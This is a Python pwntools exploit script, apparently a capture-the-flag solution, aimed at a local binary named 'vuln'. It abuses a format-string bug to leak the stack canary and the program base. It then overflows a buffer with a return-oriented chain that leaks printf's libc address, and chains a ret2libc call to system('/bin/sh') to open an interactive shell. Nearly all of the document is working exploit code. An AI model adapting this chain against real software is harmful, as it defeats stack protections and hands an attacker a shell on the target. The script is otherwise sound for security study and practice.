from pwn import *

p = process("./vuln")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

rip_backup_off = 0x0000000000001295 # saved RIP
pop_rdi_gadget_off = 0x00000000000012fb # pop rdi ; ret
puts_plt_off = 0x1040 # puts@PLT
printf_got_off = 0x4030 # printf@GOT
main_off = 0x127b # main()
bin_sh_off = 0x18a152 # "/bin/sh" in libc

payload = b"%lx,"*30 # We leak 30 unsigned longs with printf vulnerability

p.sendline(payload)

p.recvuntil(b"First name : ")

# Spliting and printing all leaks
resp = p.recv()
leak = resp.split(b",")
for i in range(len(leak)):
	print("["+str(i)+"] = "+str(leak[i].decode("utf-8")))

# Getting Stack canary 
canary_leak = leak[14]
canary = int(canary_leak, base=16)
print("Leaked stack canary : "+hex(canary))

# Getting RIP leak

rip_leak = leak[16]
rip = int(rip_leak, base=16)
print("Leaked rip backup : "+hex(rip))

# Deducing program base

PROGRAM_BASE = rip - rip_backup_off
print("Found PROGRAM BASE : "+hex(PROGRAM_BASE))


POP_RDI_GADGET = PROGRAM_BASE + pop_rdi_gadget_off
PUTS_PLT = PROGRAM_BASE + puts_plt_off
PRINTF_GOT = PROGRAM_BASE + printf_got_off

print("pop rdi ; ret gadget : "+hex(POP_RDI_GADGET))
print("printf@PLT : "+hex(PUTS_PLT))
print("printf@GOT : "+hex(PRINTF_GOT))

# Buuildiing the buffer overflow payload 

start_payload = b"A"*64 # Buffer
start_payload += b"B"*8 # Junk data
start_payload += struct.pack("Q", canary) # stack cookie/canary
start_payload += b"XXXXXXXX" # rbp backup

# Ret2PLT :
# We call puts(PRINTF_GOT) so it prints printf@LIBC

payload = start_payload
payload += p64(POP_RDI_GADGET) # pop rdi ; ret
payload += p64(PRINTF_GOT) # args[0] -> RDI
payload += p64(PUTS_PLT) # printf()
payload += p64(PROGRAM_BASE + main_off) # callling main() again so we can do ret2libc

# Send payload

p.sendline(payload)

time.sleep(1)

# Now we are in main again

print(p.recvline()) # Enter your last name : Last name : ...

received = p.recvline() # We receive the leak of printf@LIBC (raw bytes)
print("Received : "+str(received))
received = received.replace(b'\n', b"")
leak = u64(received.ljust(8, b"\x00"))
print(hex(leak))
print("printf@LIBC : "+hex(leak))

# Deducing LIBC base

libc_addr = -1
if libc != "":
    libc_addr = leak - libc.symbols["printf"] # Save libc base

print("Found LIBC base address : "+hex(libc_addr))

# Deducing "/bin/sh" str@LIBC and system@LIBC real addresses

BIN_SH = libc_addr + bin_sh_off
SYSTEM = libc_addr + libc.symbols["system"]

print("Found \"/bin/sh\" string in libc : "+hex(BIN_SH))
print("Found system@LIBC : "+hex(SYSTEM))

# Send some junk data for the first output

p.sendline(b"I will pwn you, trust me") 

print(p.recvline()) # -- WELCOME TO SUPER PROGRAM --\n

# Ret2LIBC :
# system("/bin/sh")

pay = start_payload
pay += p64(POP_RDI_GADGET)
pay += p64(BIN_SH) # RDI => ARG[0] -> "/bin/sh"
pay += p64(SYSTEM) # system("/bin/sh")

time.sleep(0.5)

# We should get interactive shell now
p.sendline(pay)

p.interactive()